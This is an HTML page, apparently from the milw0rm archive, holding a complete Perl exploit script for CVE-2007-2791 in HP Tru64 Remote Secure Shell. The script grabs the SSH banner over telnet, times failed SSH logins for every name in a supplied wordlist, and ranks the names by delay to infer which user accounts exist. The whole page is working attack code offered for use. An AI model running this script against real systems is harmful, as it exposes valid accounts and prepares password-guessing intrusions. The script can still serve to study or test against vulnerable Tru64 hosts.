<html><head><title>HP Tru64 Remote Secure Shell User Enumeration Exploit (CVE-2007-2791)</title></head><pre>#!/usr/bin/perl
use warnings;
use strict;
#
# Remember: you need to accept ssh key first!
#
use Tie::File;
use Fcntl 'O_RDONLY';
use Expect;
use Time::HiRes qw(gettimeofday);
#
# tru64-sshenum.pl
# HP Tru64 Remote Secure Shell user enumeration exploit (CVE-2007-2791).
#
# Author: Andrea &quot;bunker&quot; Purificato
# http://rawlab.mindcreations.com
#
# The following supported software versions are affected:
#
#  HP Tru64 UNIX v5.1B-4
#  HP Tru64 UNIX v5.1B-3
# 
# The Hewlett-Packard Company thanks Andrea Purificato for reporting this 
# vulnerability to security-alert@hp.com
#
# References: 
#  - http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?lang=en&amp;cc=us&amp;objectID=c01007552
#  - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2791
#  - http://rawlab.mindcreations.com/codes/exp/nix/tru64-sshenum.pl
#

my $verbose = undef;
my $port    = 22;
my $timeout = 10;

print &lt;&lt;BANNER;
$0 - HP Tru64 Remote Secure Shell user enumeration exploit

 Andrea &quot;bunker&quot; Purificato - http://rawlab.mindcreations.com
 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2 

BANNER

print &quot;Usage: $0 &lt;target&gt; &lt;userlist&gt;\n&quot; and exit(-1) if ($#ARGV&lt;1);

my $target   = $ARGV[0];
my $wordlist = $ARGV[1];
chomp (my $ssh  = `which ssh`);
chomp (my $tel  = `which telnet`);
my %htimes; my @atimes;

print &quot;[+] Grabbing banner...\n&quot;;
my $exp = Expect-&gt;spawn(&quot;$tel -l fake $target $port&quot;) 
	or die &quot;Cannot spawn $tel: $!\n&quot;;;
#$exp-&gt;log_stdout(0);
$exp-&gt;expect(5,['SSH|ssh'=&gt;sub{$exp-&gt;send(&quot;.\n&quot;)}]);
$exp-&gt;close();
print &quot;[+] Done!\n\n&quot;;

sub timing {
    my $user = shift @_;
    my $t0 = gettimeofday;
    my $t1 = undef;
    my $exp = Expect-&gt;spawn(&quot;$ssh -l $user -p $port $target&quot;) 
	or die &quot;Cannot spawn $ssh: $!\n&quot;;;
    $exp-&gt;log_stdout(0);
    $exp-&gt;expect($timeout,['assword:'=&gt;sub{$exp-&gt;send(&quot;.\n&quot;)}]);
    $exp-&gt;expect(undef,   [ qr'assword|denied'=&gt;sub{$t1=gettimeofday}]);
    $t1 = gettimeofday unless ($t1);
    $exp-&gt;close();
    return sprintf &quot;%0.3f&quot;, ($t1-$t0);
}

tie my @wlst_ln, 'Tie::File', &quot;$wordlist&quot;, mode=&gt;O_RDONLY
    or die &quot;$wordlist: $!&quot;;

print &quot;[+] Started, please wait: &quot;;
for (@wlst_ln) {
    print &quot;($_ dup?)&quot; if ($htimes{$_});
    my $ret = timing($_);
    $htimes{$_} = $ret unless ($htimes{$_});
    push @atimes, $ret;
    unless ($verbose) { print &quot;.&quot; }
    else { print &quot;$_\t\t$ret\n&quot; }
}
print &quot; Done!\n\n&quot;;

# 
# Do whatever you want with time values:
# 
# (sorted by values)
# 
foreach my $key (sort {$htimes{$b}&lt;=&gt;$htimes{$a}} keys %htimes) {
     print &quot;$key:\t\t$htimes{$key}\n&quot;;
}
exit(0);

# milw0rm.com [2007-06-04]</pre></html>